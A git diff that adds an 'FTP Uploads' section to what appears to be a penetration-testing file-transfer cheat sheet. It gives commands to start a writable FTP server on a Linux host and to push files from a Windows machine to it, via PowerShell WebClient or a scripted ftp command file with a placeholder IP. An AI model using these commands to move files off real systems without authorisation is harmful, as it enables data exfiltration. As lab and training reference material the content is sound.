@@ -203,6 +203,36 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
   ```
 If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
   </details>
+  <details> 
+  <summary><strong>FTP Uploads</strong></summary>  
+
+  1. Start our FTP Server in Linux
+  ```bash
+  sudo python3 -m pyftpdlib --port 21 --write
+  ```
+  2. Upload the file in Windows
+
+  **Option 1: Upload file using Powershell**
+  ```cmd
+  (New-Object Net.WebClient).UploadFile('ftp://<IP>/ftp-hosts', '<FILE PATH>')
+  ```
+  **Option 2: Create a Command File for the FTP Client to Upload a File**
+  Create a Command File for the FTP Client and Download the Target File
+  ```cmd
+  echo open <IP> > ftpcommand.txt
+  echo USER anonymous >> ftpcommand.txt
+  echo binary >> ftpcommand.txt
+  echo PUT <FILE PATH> >> ftpcommand.txt
+  echo bye >> ftpcommand.txt
+  ftp -v -n -s:ftpcommand.txt
+  ```
+  Once in FTP...
+  ```cmd
+  USER anonymous
+  PUT <FILE PATH>
+  bye
+  ```
+  </details>
   </details>
 </details>
 
